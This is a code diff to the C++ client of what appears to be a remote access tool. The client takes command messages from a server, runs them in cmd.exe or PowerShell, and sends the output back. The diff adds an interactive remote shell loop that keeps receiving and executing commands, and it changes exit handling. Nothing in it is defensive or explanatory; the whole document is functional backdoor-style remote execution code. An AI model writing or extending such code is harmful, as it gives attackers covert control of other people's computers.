@@ -38,11 +38,12 @@ void client::data_parser(string type, int size, string data)
 		send_data("OK", "ALIV");
 	}
 	else if (type == "CMDO") { // execute only CMD(O)nce
-		cmd_init(CommandPrompt);
+		cmd_init(CommandPrompt, false);
+		read_and_send();
 		command(data);
 	}
 	else if (type == "POSO") {
-		cmd_init(PowerShell);
+		cmd_init(PowerShell, false);
 		command(data);
 	}
 	else if (type == "NIRO") {
@@ -52,9 +53,19 @@ void client::data_parser(string type, int size, string data)
 		send_data((output) ? "True" : "False", "NIRB");
 	}
 	else if (type == "CMDS") { // command prompt shell interactive START
-		cout << "TYPE: " << type << endl
-			<< "SIZE: " << size << endl
-			<< "DATA: " << data << endl;
+		cmd_init(CommandPrompt, false);
+		read_and_send();
+		while (true) {
+			string type, data;
+			recv_data(type, data);
+			if (type == "CMDC" && active) {
+				cout << "exec:" << data << endl;
+				command(data);
+			}
+			else {
+				break;
+			}
+		}
 	}
 	else if (type == "CMDE") { // command prompt shell interactive END
 		cout << "TYPE: " << type << endl
@@ -146,7 +157,6 @@ bool client::check_error(int status)
 			LocalFree(text);
 		}
 
-
 		return false;
 	}
 	else {
@@ -227,7 +237,6 @@ bool client::recv_data(string &type_h, string &data_h) {
 		}
 	}
 	else {
-
 	}
 }
 
@@ -376,9 +385,9 @@ bool client::read_and_send(string command, int length) {
 			auto command_index = 0;
 
 			for (; command_index < length; command_index++) { if (output[command_index] == command[command_index]) { continue; } else { break; } }
-			
+
 			string last2chars = output.substr(output.length() - 2);
-			
+
 			bool end_cmd = (output.back() == '>');
 
 			bool end_ps = (last2chars == "> ");
@@ -390,8 +399,7 @@ bool client::read_and_send(string command, int length) {
 			else if (active_prompt == PowerShell) {
 				send_data(output.substr(command_index), "POSO");
 			}
-			
-			
+
 			if (end_cmd || end_ps || end_cst) {
 				break;
 			}
@@ -408,7 +416,6 @@ bool client::read_and_send(string command, int length) {
 	}
 	return 0;
 }
-
 
 bool client::read_cmd(string command = "", int length = 0)
 {
@@ -583,7 +590,6 @@ void client::cmd_init(int type, bool output, int delay, int pipe_size)
 	set_delay(delay);
 	set_pipe_size(pipe_size);
 
-
 	// BITWISE - Comparison works by returning the int by the bitwise cmp and if the int is nonzero then the output equals true else false.
 	if (type & CommandPrompt) {
 		active_prompt = CommandPrompt;
@@ -611,24 +617,25 @@ void client::command(string command)
 		nircmd(command.substr(7), output); // use 7 to include parser space
 	}
 	else
-	if (command == "exit") { //use !exit to call internal exit
-		client::endme();
-	}
-	else {
-		string parsed_command;
-		if (command[0] == '!') {
-			parsed_command = command.substr(1);
+		if (command == "exit") { //use !exit to call internal exit
+			client::endme_cmd();
+			send_data(" ", "CMDK");
 		}
 		else {
-			parsed_command = command;
+			string parsed_command;
+			if (command[0] == '!') {
+				parsed_command = command.substr(1);
+			}
+			else {
+				parsed_command = command;
+			}
+
+			int command_size;
+
+			client::write_cmd(parsed_command.c_str(), command_size);
+
+			client::read_and_send(parsed_command.c_str(), command_size);
 		}
-
-		int command_size;
-
-		client::write_cmd(parsed_command.c_str(), command_size);
-
-		client::read_and_send(parsed_command.c_str(), command_size);
-	}
 
 	return;
 }
